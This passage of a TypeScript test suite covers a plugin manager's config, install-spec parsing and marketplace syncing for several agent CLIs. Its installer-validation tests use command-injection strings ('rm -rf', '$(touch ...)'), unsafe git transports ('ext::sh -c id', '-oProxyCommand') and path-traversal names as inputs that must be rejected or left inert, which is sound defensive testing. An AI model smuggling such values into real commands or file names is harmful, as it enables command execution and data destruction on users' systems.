    const config = loadUserConfig('nonexistent-plugin-xzy987');
    expect(config).toEqual({});
  });

  it('saveUserConfig writes valid JSON, loadUserConfig reads it back', async () => {
    const pluginName = `_test-plugin-${Date.now()}`;
    const testConfig = { api_key: 'abc123', region: 'eu-west-1' };
    const pluginsDir = path.join(tmpDir, 'plugins');

    vi.resetModules();
    vi.doMock('../state.js', async (importOriginal) => {
      const actual = await importOriginal<typeof import('../state.js')>();
      return { ...actual, getPluginsDir: () => pluginsDir };
    });
    try {
      const { saveUserConfig: save, loadUserConfig: load } = await import('./plugins.js');
      save(pluginName, testConfig);
      const loaded = load(pluginName);
      expect(loaded).toEqual(testConfig);
    } finally {
      vi.doUnmock('../state.js');
      vi.resetModules();
    }
  });
});

// ─── checkPluginDependencies ──────────────────────────────────────────────────

describePlugins('checkPluginDependencies', () => {
  it('returns empty array when no dependencies declared', () => {
    const manifest: PluginManifest = { name: 'x', description: '', version: '1.0.0' };
    expect(checkPluginDependencies(manifest)).toEqual([]);
  });

  it('returns empty array when dependencies list is empty', () => {
    const manifest: PluginManifest = { name: 'x', description: '', version: '1.0.0', dependencies: [] };
    expect(checkPluginDependencies(manifest)).toEqual([]);
  });

  it('returns missing plugin names that are not installed', () => {
    // This relies on the real plugin discovery — in a clean test env
    // no plugins are installed, so any declared dep is "missing".
    const manifest: PluginManifest = {
      name: 'x', description: '', version: '1.0.0',
      dependencies: ['nonexistent-dep-xzy987'],
    };
    const missing = checkPluginDependencies(manifest);
    expect(missing).toContain('nonexistent-dep-xzy987');
  });
});

// ─── parseInstallSpec ─────────────────────────────────────────────────────────

describePlugins('parseInstallSpec', () => {
  it('parses name@source form', () => {
    const result = parseInstallSpec('my-plugin@https://github.com/user/repo.git');
    expect(result.name).toBe('my-plugin');
    expect(result.source).toBe('https://github.com/user/repo.git');
  });

  it('returns null name for bare source without @', () => {
    const result = parseInstallSpec('/path/to/plugin');
    expect(result.name).toBeNull();
    expect(result.source).toBe('/path/to/plugin');
  });

  it('handles git@ SSH URLs without treating @ as separator (no name prefix)', () => {
    // git@github.com:user/repo.git — the atIdx is > 0, so it would be split.
    // This is a known limitation: git SSH URLs with no name prefix get split.
    // When using SSH URLs, users should always provide a name: name@git@host...
    const result = parseInstallSpec('git@github.com:user/repo.git');
    expect(result.name).toBe('git');
    expect(result.source).toBe('github.com:user/repo.git');
  });

  it('handles name@local-path', () => {
    const result = parseInstallSpec('rush-toolkit@~/Projects/rush-toolkit');
    expect(result.name).toBe('rush-toolkit');
    expect(result.source).toBe('~/Projects/rush-toolkit');
  });
});

// ─── installPlugin validation ────────────────────────────────────────────────

describePlugins('installPlugin validation', () => {
  let tmpDir: string;
  let pluginsDir: string;
  let execFileSyncMock: ReturnType<typeof vi.fn>;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'agents-test-'));
    pluginsDir = path.join(tmpDir, 'plugins');
    execFileSyncMock = vi.fn();
    vi.resetModules();
    vi.doMock('../state.js', async (importOriginal) => {
      const actual = await importOriginal<typeof import('../state.js')>();
      return { ...actual, getPluginsDir: () => pluginsDir };
    });
    vi.doMock('child_process', async (importOriginal) => {
      const actual = await importOriginal<typeof import('child_process')>();
      return { ...actual, execFileSync: execFileSyncMock };
    });
  });

  afterEach(() => {
    vi.doUnmock('../state.js');
    vi.doUnmock('child_process');
    vi.resetModules();
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  it.each(['../etc', 'foo/bar', 'foo\\bar', '..', 'foo\\0bar', 'foo\0bar', '', '.', 'a/b'])(
    'rejects invalid plugin name %j',
    (name) => {
      expect(validatePluginName(name)).toBe(false);
    }
  );

  it('accepts a simple plugin name', () => {
    expect(validatePluginName('safe-plugin_1.0')).toBe(true);
    expect(validatePluginName('my-plugin')).toBe(true);
  });

  it.each([
    'evil; rm -rf /tmp/SHOULD_NOT_DELETE',
    '$(touch /tmp/SHOULD_NOT_EXIST)',
    '`touch /tmp/SHOULD_NOT_EXIST`',
  ])('passes git clone input through execFileSync argv form after "--": %s', async (source) => {
    const { installPlugin } = await import('./plugins.js');

    await expect(installPlugin(`safe@${source}`)).rejects.toThrow('Installed source has no valid .claude-plugin/plugin.json');

    expect(execFileSyncMock).toHaveBeenCalledOnce();
    const [bin, args, opts] = execFileSyncMock.mock.calls[0];
    expect(bin).toBe('git');
    // "--" separates options from operands so the source can never be parsed
    // as a git flag; the metacharacters above are inert in argv form.
    expect(args.slice(0, 4)).toEqual(['clone', '--depth', '1', '--']);
    expect(args[4]).toBe(source);
    expect(toPosix(args[5])).toMatch(/\/safe$/);
    expect(opts).toEqual({ stdio: 'pipe' });
  });

  it.each([
    'ext::sh -c id',
    '-oProxyCommand=evil',
    'http://example.com/repo.git',
  ])('rejects unsafe git transport before cloning: %s', async (source) => {
    const { installPlugin } = await import('./plugins.js');

    await expect(installPlugin(`safe@${source}`)).rejects.toThrow(/Refusing to use git source/);
    expect(execFileSyncMock).not.toHaveBeenCalled();
  });

  it('rejects path-traversal plugin names before copying a local source', async () => {
    const sourceRoot = makePluginRoot(tmpDir, { name: 'safe' });
    const { installPlugin } = await import('./plugins.js');

    await expect(installPlugin(`../../foo@${sourceRoot}`)).rejects.toThrow('Invalid plugin name: ../../foo');

    expect(fs.existsSync(path.resolve(pluginsDir, '../../foo'))).toBe(false);
    expect(execFileSyncMock).not.toHaveBeenCalled();
  });
});

describePlugins('assertPluginTargetContained', () => {
  it('throws when target equals the plugins root', () => {
    expect(() => assertPluginTargetContained('/plugins', '/plugins')).toThrow(/Plugin install target escapes plugins directory/);
    expect(() => assertPluginTargetContained('/plugins/', '/plugins')).toThrow(/Plugin install target escapes plugins directory/);
  });

  it('allows strict subdirectories', () => {
    expect(() => assertPluginTargetContained('/plugins/my-plugin', '/plugins')).not.toThrow();
    expect(() => assertPluginTargetContained('/plugins/my-plugin/sub', '/plugins')).not.toThrow();
  });

  it('throws when target escapes the plugins root', () => {
    expect(() => assertPluginTargetContained('/other', '/plugins')).toThrow(/Plugin install target escapes plugins directory/);
    expect(() => assertPluginTargetContained('/plugins-other', '/plugins')).toThrow(/Plugin install target escapes plugins directory/);
  });
});

// ─── syncPluginToVersion: native marketplace install ────────────────────────

describePlugins('syncPluginToVersion (native marketplace install)', () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'agents-test-'));
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  async function setupBasicPlugin(name = 'myplugin'): Promise<{ pluginRoot: string; versionHome: string; plugin: DiscoveredPlugin }> {
    const pluginRoot = path.join(tmpDir, name);
    fs.mkdirSync(path.join(pluginRoot, '.claude-plugin'), { recursive: true });
    fs.writeFileSync(
      path.join(pluginRoot, '.claude-plugin', 'plugin.json'),
      JSON.stringify({ name, version: '1.0.0', description: 'test', author: { name: 'tester' } })
    );
    const versionHome = path.join(tmpDir, `${name}-home`);
    fs.mkdirSync(path.join(versionHome, '.claude'), { recursive: true });

    const plugin: DiscoveredPlugin = {
      name,
      root: pluginRoot,
      manifest: { name, version: '1.0.0', description: 'test' },
      skills: [],
      hooks: [],
      scripts: [],
      commands: [],
      agentDefs: [],
      workflows: [],
      memory: [],

      bin: [],
      mcpServers: [],
      lspServers: [],
      monitors: [],
      hasMcp: false,
      hasSettings: false,
    };
    return { pluginRoot, versionHome, plugin };
  }

  it('copies plugin source into marketplaces/agents-cli/plugins/<name>/', async () => {
    const { pluginRoot, versionHome, plugin } = await setupBasicPlugin();
    fs.writeFileSync(path.join(pluginRoot, 'README.md'), '# hi');

    const { syncPluginToVersion } = await import('./plugins.js');
    syncPluginToVersion(plugin, 'claude', versionHome);

    const installDir = path.join(versionHome, '.claude', 'plugins', 'marketplaces', 'agents-cli', 'plugins', 'myplugin');
    expect(fs.existsSync(path.join(installDir, '.claude-plugin', 'plugin.json'))).toBe(true);
    expect(fs.existsSync(path.join(installDir, 'README.md'))).toBe(true);
  });

  it('synthesizes a marketplace.json catalog', async () => {
    const { versionHome, plugin } = await setupBasicPlugin();
    const { syncPluginToVersion } = await import('./plugins.js');
    syncPluginToVersion(plugin, 'claude', versionHome);

    const manifestPath = path.join(versionHome, '.claude', 'plugins', 'marketplaces', 'agents-cli', '.claude-plugin', 'marketplace.json');
    expect(fs.existsSync(manifestPath)).toBe(true);
    const manifest = JSON.parse(fs.readFileSync(manifestPath, 'utf-8'));
    expect(manifest.name).toBe('agents-cli');
    expect(manifest.plugins).toHaveLength(1);
    expect(manifest.plugins[0]).toMatchObject({
      name: 'myplugin',
      source: './plugins/myplugin',
      version: '1.0.0',
    });
  });

  it('registers the marketplace in known_marketplaces.json', async () => {
    const { versionHome, plugin } = await setupBasicPlugin();
    const { syncPluginToVersion } = await import('./plugins.js');
    syncPluginToVersion(plugin, 'claude', versionHome);

    const knownPath = path.join(versionHome, '.claude', 'plugins', 'known_marketplaces.json');
    expect(fs.existsSync(knownPath)).toBe(true);
    const known = JSON.parse(fs.readFileSync(knownPath, 'utf-8'));
    expect(known['agents-cli']).toBeDefined();
    expect(known['agents-cli'].source).toEqual({
      source: 'directory',
      path: path.join(versionHome, '.claude', 'plugins', 'marketplaces', 'agents-cli'),
    });
  });

  it('enables the plugin in settings.json#enabledPlugins', async () => {
    const { versionHome, plugin } = await setupBasicPlugin();
    fs.writeFileSync(path.join(versionHome, '.claude', 'settings.json'), JSON.stringify({ theme: 'dark' }));

    const { syncPluginToVersion } = await import('./plugins.js');
    syncPluginToVersion(plugin, 'claude', versionHome);

    const settings = JSON.parse(fs.readFileSync(path.join(versionHome, '.claude', 'settings.json'), 'utf-8'));
    expect(settings.enabledPlugins).toEqual({ 'myplugin@agents-cli': true });
    expect(settings.theme).toBe('dark');
  });

  it('does not auto-enable plugins with executable surfaces unless explicitly allowed', async () => {
    const { pluginRoot, versionHome, plugin } = await setupBasicPlugin();
    fs.mkdirSync(path.join(pluginRoot, 'hooks'), { recursive: true });
    fs.writeFileSync(path.join(pluginRoot, 'hooks', 'hooks.json'), JSON.stringify({ audit: { command: 'hooks/foo.sh' } }));
    plugin.hooks = ['audit'];

    const { syncPluginToVersion } = await import('./plugins.js');
    syncPluginToVersion(plugin, 'claude', versionHome);

    const settingsPath = path.join(versionHome, '.claude', 'settings.json');
    expect(fs.existsSync(settingsPath)).toBe(false);

    syncPluginToVersion(plugin, 'claude', versionHome, { allowExecSurfaces: true });
    const trustedSettings = JSON.parse(fs.readFileSync(settingsPath, 'utf-8'));
    expect(trustedSettings.enabledPlugins).toEqual({ 'myplugin@agents-cli': true });
  });

  it('preserves ${CLAUDE_PLUGIN_ROOT} in copied .mcp.json (Claude expands natively)', async () => {
    const { pluginRoot, versionHome, plugin } = await setupBasicPlugin();
    fs.writeFileSync(
      path.join(pluginRoot, '.mcp.json'),
      JSON.stringify({ mcpServers: { 'my-server': { command: 'node', args: ['${CLAUDE_PLUGIN_ROOT}/server.js'] } } })
    );
    plugin.hasMcp = true;

    const { syncPluginToVersion } = await import('./plugins.js');
    syncPluginToVersion(plugin, 'claude', versionHome);

    const copiedMcp = path.join(
      versionHome, '.claude', 'plugins', 'marketplaces', 'agents-cli', 'plugins', 'myplugin', '.mcp.json'
    );
    const parsed = JSON.parse(fs.readFileSync(copiedMcp, 'utf-8'));
    expect(parsed.mcpServers['my-server'].args[0]).toBe('${CLAUDE_PLUGIN_ROOT}/server.js');
  });

  it('migrates legacy dual-dash skill/command directories away', async () => {
    const { pluginRoot, versionHome, plugin } = await setupBasicPlugin('legacy');
    plugin.root = pluginRoot;

    // Legacy layout: previous agents-cli put files at these flat paths.
    const legacySkill = path.join(versionHome, '.claude', 'skills', 'legacy--blog');
    fs.mkdirSync(legacySkill, { recursive: true });
    fs.writeFileSync(path.join(legacySkill, 'SKILL.md'), 'legacy');
    const legacyCmd = path.join(versionHome, '.claude', 'commands', 'legacy--deploy.md');
    fs.mkdirSync(path.dirname(legacyCmd), { recursive: true });
    fs.writeFileSync(legacyCmd, 'legacy');

    const { syncPluginToVersion } = await import('./plugins.js');
    syncPluginToVersion(plugin, 'claude', versionHome);

    expect(fs.existsSync(legacySkill)).toBe(false);
    expect(fs.existsSync(legacyCmd)).toBe(false);
  });
});

// ─── syncPluginToVersion: Droid (.factory + .factory-plugin manifest) ─────────

describePlugins('syncPluginToVersion (droid native marketplace install)', () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'agents-test-'));
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  function setupDroidPlugin(name = 'myplugin'): { pluginRoot: string; versionHome: string; plugin: DiscoveredPlugin } {
    const pluginRoot = path.join(tmpDir, name);
    fs.mkdirSync(path.join(pluginRoot, '.claude-plugin'), { recursive: true });
    fs.writeFileSync(
      path.join(pluginRoot, '.claude-plugin', 'plugin.json'),
      JSON.stringify({ name, version: '1.0.0', description: 'test', author: { name: 'tester' } })
    );
    const versionHome = path.join(tmpDir, `${name}-home`);
    fs.mkdirSync(path.join(versionHome, '.factory'), { recursive: true });

    const plugin: DiscoveredPlugin = {
      name,
      root: pluginRoot,
      manifest: { name, version: '1.0.0', description: 'test' },
      skills: [],
      hooks: [],
      scripts: [],
      commands: [],
      agentDefs: [],
      workflows: [],
      memory: [],

      bin: [],
      mcpServers: [],
      lspServers: [],
      monitors: [],
      hasMcp: false,
      hasSettings: false,
    };
    return { pluginRoot, versionHome, plugin };
  }

  it('copies plugin source into .factory/plugins/marketplaces/agents-cli/plugins/<name>/', async () => {
    const { pluginRoot, versionHome, plugin } = setupDroidPlugin();
    fs.writeFileSync(path.join(pluginRoot, 'README.md'), '# hi');

    const { syncPluginToVersion } = await import('./plugins.js');
    syncPluginToVersion(plugin, 'droid', versionHome);

    const installDir = path.join(versionHome, '.factory', 'plugins', 'marketplaces', 'agents-cli', 'plugins', 'myplugin');
    expect(fs.existsSync(path.join(installDir, '.claude-plugin', 'plugin.json'))).toBe(true);
    expect(fs.existsSync(path.join(installDir, 'README.md'))).toBe(true);
  });

  it('mirrors the manifest into .factory-plugin/plugin.json (droid native manifest dir)', async () => {
    const { versionHome, plugin } = setupDroidPlugin();

    const { syncPluginToVersion } = await import('./plugins.js');
    syncPluginToVersion(plugin, 'droid', versionHome);

    const installDir = path.join(versionHome, '.factory', 'plugins', 'marketplaces', 'agents-cli', 'plugins', 'myplugin');
    const factoryManifest = path.join(installDir, '.factory-plugin', 'plugin.json');
    expect(fs.existsSync(factoryManifest)).toBe(true);
    const parsed = JSON.parse(fs.readFileSync(factoryManifest, 'utf-8'));
    expect(parsed.name).toBe('myplugin');
    expect(parsed.version).toBe('1.0.0');
  });

  it('registers the marketplace with source "local" and enables the plugin (top-level)', async () => {
    const { versionHome, plugin } = setupDroidPlugin();
    fs.writeFileSync(path.join(versionHome, '.factory', 'settings.json'), JSON.stringify({ logoAnimation: 'off' }));

    const { syncPluginToVersion } = await import('./plugins.js');
    syncPluginToVersion(plugin, 'droid', versionHome);

    // Droid ignores a "directory" source; it must be "local" (+ autoUpdate).
    const knownPath = path.join(versionHome, '.factory', 'plugins', 'known_marketplaces.json');
    const known = JSON.parse(fs.readFileSync(knownPath, 'utf-8'));
    expect(known['agents-cli'].source.source).toBe('local');
    expect(known['agents-cli'].autoUpdate).toBe(true);

    const settings = JSON.parse(fs.readFileSync(path.join(versionHome, '.factory', 'settings.json'), 'utf-8'));
    expect(settings.enabledPlugins).toEqual({ 'myplugin@agents-cli': true });
    // Pre-existing keys are preserved.
    expect(settings.logoAnimation).toBe('off');
  });

  it('records the plugin in installed_plugins.json pointing at the marketplace install dir', async () => {
    const { versionHome, plugin } = setupDroidPlugin();

    const { syncPluginToVersion } = await import('./plugins.js');
    syncPluginToVersion(plugin, 'droid', versionHome);

    const installedPath = path.join(versionHome, '.factory', 'plugins', 'installed_plugins.json');
    expect(fs.existsSync(installedPath)).toBe(true);
    const registry = JSON.parse(fs.readFileSync(installedPath, 'utf-8'));
    expect(registry.schemaVersion).toBe(1);
    const entries = registry.plugins['myplugin@agents-cli'];
    expect(Array.isArray(entries)).toBe(true);
    expect(entries).toHaveLength(1);
    expect(entries[0].scope).toBe('user');
    expect(entries[0].version).toBe('1.0.0');
    expect(entries[0].source).toBe('agents-cli');
    const installDir = path.join(versionHome, '.factory', 'plugins', 'marketplaces', 'agents-cli', 'plugins', 'myplugin');
    expect(entries[0].installPath).toBe(installDir);
    expect(fs.existsSync(path.join(entries[0].installPath, '.claude-plugin', 'plugin.json'))).toBe(true);
  });

  it('isPluginSynced is true after sync, and false once the installed registry entry is dropped', async () => {
    const { versionHome, plugin } = setupDroidPlugin();
    const { syncPluginToVersion, isPluginSynced } = await import('./plugins.js');
    syncPluginToVersion(plugin, 'droid', versionHome);
    expect(isPluginSynced(plugin, 'droid', versionHome)).toBe(true);

    // Marketplace copy present but registry entry gone => not synced (droid can't see it).
    fs.rmSync(path.join(versionHome, '.factory', 'plugins', 'installed_plugins.json'));
    expect(isPluginSynced(plugin, 'droid', versionHome)).toBe(false);
  });

  it('removePluginFromVersion clears the installed registry entry', async () => {
    const { versionHome, plugin } = setupDroidPlugin();
    const { syncPluginToVersion, removePluginFromVersion, isPluginSynced } = await import('./plugins.js');
    syncPluginToVersion(plugin, 'droid', versionHome);
    expect(isPluginSynced(plugin, 'droid', versionHome)).toBe(true);

    removePluginFromVersion(plugin.name, plugin.root, 'droid', versionHome);
    const installedPath = path.join(versionHome, '.factory', 'plugins', 'installed_plugins.json');
    // File removed (registry emptied) or no longer carries the entry.
    if (fs.existsSync(installedPath)) {
      const registry = JSON.parse(fs.readFileSync(installedPath, 'utf-8'));
      expect(registry.plugins['myplugin@agents-cli']).toBeUndefined();
    }
    expect(isPluginSynced(plugin, 'droid', versionHome)).toBe(false);
  });
});

// ─── syncPluginToVersion: per-marketplace routing ────────────────────────────

describePlugins('syncPluginToVersion (per-marketplace routing)', () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'agents-test-'));
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  function makePluginInMarketplace(name: string, marketplace: string): { plugin: DiscoveredPlugin; versionHome: string } {
    const pluginRoot = path.join(tmpDir, `${marketplace}-${name}`);
    fs.mkdirSync(path.join(pluginRoot, '.claude-plugin'), { recursive: true });
    fs.writeFileSync(
      path.join(pluginRoot, '.claude-plugin', 'plugin.json'),
      JSON.stringify({ name, version: '1.0.0', description: 'routed' })
    );
    const versionHome = path.join(tmpDir, `${marketplace}-${name}-home`);
    fs.mkdirSync(path.join(versionHome, '.claude'), { recursive: true });
    const plugin: DiscoveredPlugin = {
      name, root: pluginRoot,
      manifest: { name, version: '1.0.0', description: 'routed' },
      skills: [], hooks: [], scripts: [], commands: [], agentDefs: [], workflows: [], memory: [],
 bin: [],
      mcpServers: [], lspServers: [], monitors: [],
      hasMcp: false, hasSettings: false,
      marketplace,
    };
    return { plugin, versionHome };
  }

  it('installs an extra-repo plugin under marketplaces/agents-extras/, not the user marketplace', async () => {
    const { plugin, versionHome } = makePluginInMarketplace('tool', 'agents-extras');
    const { syncPluginToVersion } = await import('./plugins.js');
    syncPluginToVersion(plugin, 'claude', versionHome);

    const extraDir = path.join(versionHome, '.claude', 'plugins', 'marketplaces', 'agents-extras', 'plugins', 'tool');
    const userDir = path.join(versionHome, '.claude', 'plugins', 'marketplaces', 'agents-cli', 'plugins', 'tool');
    expect(fs.existsSync(path.join(extraDir, '.claude-plugin', 'plugin.json'))).toBe(true);
    expect(fs.existsSync(userDir)).toBe(false);

    // Catalog is synthesized under the extra marketplace with its own name.
    const manifest = JSON.parse(fs.readFileSync(
      path.join(versionHome, '.claude', 'plugins', 'marketplaces', 'agents-extras', '.claude-plugin', 'marketplace.json'), 'utf-8'
    ));
    expect(manifest.name).toBe('agents-extras');
    expect(manifest.plugins.map((p: { name: string }) => p.name)).toEqual(['tool']);
  });

  it('enables an extra-repo plugin as <plugin>@agents-extras, not @agents-cli', async () => {
    const { plugin, versionHome } = makePluginInMarketplace('tool', 'agents-extras');
    const { syncPluginToVersion } = await import('./plugins.js');
    syncPluginToVersion(plugin, 'claude', versionHome);

    const settings = JSON.parse(fs.readFileSync(path.join(versionHome, '.claude', 'settings.json'), 'utf-8'));
    expect(settings.enabledPlugins).toEqual({ 'tool@agents-extras': true });
    expect(settings.enabledPlugins['tool@agents-cli']).toBeUndefined();
  });

  it('installs a project-repo plugin under marketplaces/agents-project/ with key <plugin>@agents-project', async () => {
    const { plugin, versionHome } = makePluginInMarketplace('proj', 'agents-project');
    const { syncPluginToVersion } = await import('./plugins.js');
    syncPluginToVersion(plugin, 'claude', versionHome);

    const projDir = path.join(versionHome, '.claude', 'plugins', 'marketplaces', 'agents-project', 'plugins', 'proj');
    expect(fs.existsSync(path.join(projDir, '.claude-plugin', 'plugin.json'))).toBe(true);

    const settings = JSON.parse(fs.readFileSync(path.join(versionHome, '.claude', 'settings.json'), 'utf-8'));
    expect(settings.enabledPlugins).toEqual({ 'proj@agents-project': true });

    const known = JSON.parse(fs.readFileSync(
      path.join(versionHome, '.claude', 'plugins', 'known_marketplaces.json'), 'utf-8'
    ));
    expect(known['agents-project']).toBeDefined();
  });

  it('routes collided plugin names into separate marketplace dirs', async () => {
    // Same plugin name "code" from two repos → two install dirs, two settings keys.
    const versionHome = path.join(tmpDir, 'collide-home');
    fs.mkdirSync(path.join(versionHome, '.claude'), { recursive: true });
    const { syncPluginToVersion } = await import('./plugins.js');

    for (const marketplace of ['agents-cli', 'agents-extras']) {
      const pluginRoot = path.join(tmpDir, `${marketplace}-code`);
      fs.mkdirSync(path.join(pluginRoot, '.claude-plugin'), { recursive: true });
      fs.writeFileSync(
        path.join(pluginRoot, '.claude-plugin', 'plugin.json'),
        JSON.stringify({ name: 'code', version: '1.0.0', description: marketplace })
      );
      syncPluginToVersion(
        {
          name: 'code', root: pluginRoot,
          manifest: { name: 'code', version: '1.0.0', description: marketplace },
          skills: [], hooks: [], scripts: [], commands: [], agentDefs: [], workflows: [], memory: [],
 bin: [],
          mcpServers: [], lspServers: [], monitors: [], hasMcp: false, hasSettings: false,
          marketplace,
        },
        'claude', versionHome
      );
    }

    const base = path.join(versionHome, '.claude', 'plugins', 'marketplaces');
    expect(fs.existsSync(path.join(base, 'agents-cli', 'plugins', 'code', '.claude-plugin', 'plugin.json'))).toBe(true);
    expect(fs.existsSync(path.join(base, 'agents-extras', 'plugins', 'code', '.claude-plugin', 'plugin.json'))).toBe(true);
    const settings = JSON.parse(fs.readFileSync(path.join(versionHome, '.claude', 'settings.json'), 'utf-8'));
    expect(settings.enabledPlugins).toEqual({ 'code@agents-cli': true, 'code@agents-extras': true });
  });
});

// ─── removePluginFromVersion (integration) ────────────────────────────────────

describePlugins('removePluginFromVersion', () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'agents-test-'));
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  it('removes the marketplace install dir and disables the plugin', async () => {
    const { syncPluginToVersion, removePluginFromVersion } = await import('./plugins.js');
    const pluginRoot = path.join(tmpDir, 'mp');
    fs.mkdirSync(path.join(pluginRoot, '.claude-plugin'), { recursive: true });
    fs.writeFileSync(
      path.join(pluginRoot, '.claude-plugin', 'plugin.json'),
      JSON.stringify({ name: 'mp', version: '1.0.0', description: 'test' })
    );

    const versionHome = path.join(tmpDir, 'home');
    fs.mkdirSync(path.join(versionHome, '.claude'), { recursive: true });
    const plugin: DiscoveredPlugin = {
      name: 'mp', root: pluginRoot,
      manifest: { name: 'mp', version: '1.0.0', description: 'test' },
      skills: [], hooks: [], scripts: [], commands: [], agentDefs: [], workflows: [], memory: [],
 bin: [],
      mcpServers: [], lspServers: [], monitors: [],
      hasMcp: false, hasSettings: false,
    };
    syncPluginToVersion(plugin, 'claude', versionHome);

    const installDir = path.join(versionHome, '.claude', 'plugins', 'marketplaces', 'agents-cli', 'plugins', 'mp');
    expect(fs.existsSync(installDir)).toBe(true);

    removePluginFromVersion('mp', pluginRoot, 'claude', versionHome);

    expect(fs.existsSync(installDir)).toBe(false);
    const settings = JSON.parse(fs.readFileSync(path.join(versionHome, '.claude', 'settings.json'), 'utf-8'));
    expect(settings.enabledPlugins?.['mp@agents-cli']).toBeUndefined();

    // Last plugin gone: marketplace dir and known_marketplaces entry should also be removed.
    expect(fs.existsSync(path.join(versionHome, '.claude', 'plugins', 'marketplaces', 'agents-cli'))).toBe(false);
    const knownPath = path.join(versionHome, '.claude', 'plugins', 'known_marketplaces.json');
    if (fs.existsSync(knownPath)) {
      const known = JSON.parse(fs.readFileSync(knownPath, 'utf-8'));
      expect(known['agents-cli']).toBeUndefined();
    }
  });

  it('cleans up legacy dual-dash command files left from older agents-cli', async () => {
    const { removePluginFromVersion: remove } = await import('./plugins.js');

    const pluginRoot = path.join(tmpDir, 'plugin');
    const versionHome = path.join(tmpDir, 'home');
    // Claude's commands subdir is 'commands' — hardcoded here to keep this test
    // robust against test-isolation mocking of ./agents.js elsewhere in the suite.
    const commandsDir = path.join(versionHome, '.claude', 'commands');
    fs.mkdirSync(commandsDir, { recursive: true });

    fs.writeFileSync(path.join(commandsDir, 'myplugin--deploy.md'), '# deploy');
    fs.writeFileSync(path.join(commandsDir, 'other-cmd.md'), '# other');

    const result = remove('myplugin', pluginRoot, 'claude', versionHome);
    expect(result.commands).toContain('myplugin--deploy.md');
    expect(fs.existsSync(path.join(commandsDir, 'myplugin--deploy.md'))).toBe(false);
    expect(fs.existsSync(path.join(commandsDir, 'other-cmd.md'))).toBe(true);
  });

  it('strips legacy namespaced MCP servers from settings.json', async () => {
    const { removePluginFromVersion: remove } = await import('./plugins.js');
    const pluginRoot = path.join(tmpDir, 'plugin');
    const versionHome = path.join(tmpDir, 'home');
    const claudeDir = path.join(versionHome, '.claude');
    fs.mkdirSync(claudeDir, { recursive: true });

    fs.writeFileSync(
      path.join(claudeDir, 'settings.json'),
      JSON.stringify({
        mcpServers: {
          'myplugin--server-a': { command: 'node', args: [] },
          'other-server': { command: 'node', args: [] },
        },
      })
    );

    const result = remove('myplugin', pluginRoot, 'claude', versionHome);
    expect(result.mcp).toBe(1);

    const settings = JSON.parse(fs.readFileSync(path.join(claudeDir, 'settings.json'), 'utf-8'));
    expect(settings.mcpServers['myplugin--server-a']).toBeUndefined();
    expect(settings.mcpServers['other-server']).toBeDefined();
  });
});

// ─── pluginResourceGroups ───────────────────────────────────────────────────

describePlugins('pluginResourceGroups', () => {
  it('returns ordered, non-empty groups with slash-prefixed skills and commands', () => {
    const plugin = makeDiscoveredPlugin('/tmp/code', { name: 'code', version: '1.0.0', description: 'x' });
    plugin.skills = ['dispatch', 'verify'];
    plugin.commands = ['ship'];
    plugin.agentDefs = ['reviewer'];
    plugin.hooks = ['pre-commit'];
    plugin.mcpServers = ['context7'];

    const groups = pluginResourceGroups(plugin);

    expect(groups.map((g) => g.label)).toEqual(['skills', 'commands', 'subagents', 'hooks', 'mcp']);
    expect(groups[0].items).toEqual(['/code:dispatch', '/code:verify']);
    expect(groups[1].items).toEqual(['/code:ship']);
    expect(groups[2].items).toEqual(['reviewer']);
  });

  it('omits empty categories', () => {
    const plugin = makeDiscoveredPlugin('/tmp/only-skills', { name: 'only-skills', version: '1.0.0', description: 'x' });
    plugin.skills = ['a'];

    expect(pluginResourceGroups(plugin).map((g) => g.label)).toEqual(['skills']);
  });

  it('appends a settings group only when the plugin merges settings, always last', () => {
    const base = makeDiscoveredPlugin('/tmp/s', { name: 's', version: '1.0.0', description: 'x' });
    base.scripts = ['build.sh'];
    expect(pluginResourceGroups(base).map((g) => g.label)).toEqual(['scripts']);

    const withSettings = makeDiscoveredPlugin('/tmp/s2', { name: 's2', version: '1.0.0', description: 'x' });
    withSettings.scripts = ['build.sh'];
    withSettings.hasSettings = true;
    const groups = pluginResourceGroups(withSettings);
    expect(groups.map((g) => g.label)).toEqual(['scripts', 'settings']);
    expect(groups[groups.length - 1].items).toEqual(['settings.json']);
  });

  it('returns an empty array for a plugin packaging nothing', () => {
    const plugin = makeDiscoveredPlugin('/tmp/empty', { name: 'empty', version: '1.0.0', description: 'x' });
    expect(pluginResourceGroups(plugin)).toEqual([]);
  });
});

// ─── syncPluginToVersion: OpenCode (TS/JS modules) ───────────────────────────

describePlugins('syncPluginToVersion (opencode TS modules)', () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'agents-test-'));
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  function setupOpenCodePlugin(name = 'myplugin'): {
    pluginRoot: string;
    versionHome: string;
    plugin: DiscoveredPlugin;
  } {
    const pluginRoot = path.join(tmpDir, name);
    fs.mkdirSync(path.join(pluginRoot, '.claude-plugin'), { recursive: true });
    fs.writeFileSync(
      path.join(pluginRoot, '.claude-plugin', 'plugin.json'),
      JSON.stringify({ name, version: '1.0.0', description: 'test', author: { name: 'tester' } })
    );
    const versionHome = path.join(tmpDir, `${name}-home`);
    fs.mkdirSync(versionHome, { recursive: true });
    const plugin: DiscoveredPlugin = {
      name,
      root: pluginRoot,
      manifest: { name, version: '1.0.0', description: 'test' },
      skills: [],
      hooks: [],
      scripts: [],
      commands: [],
      agentDefs: [],
      workflows: [],
      memory: [],

      bin: [],
      mcpServers: [],
      lspServers: [],
      monitors: [],
      hasMcp: false,
      hasSettings: false,
    };
    return { pluginRoot, versionHome, plugin };
  }

  it('copies a single opencode/*.ts module to ~/.config/opencode/plugins/<name>.ts', async () => {
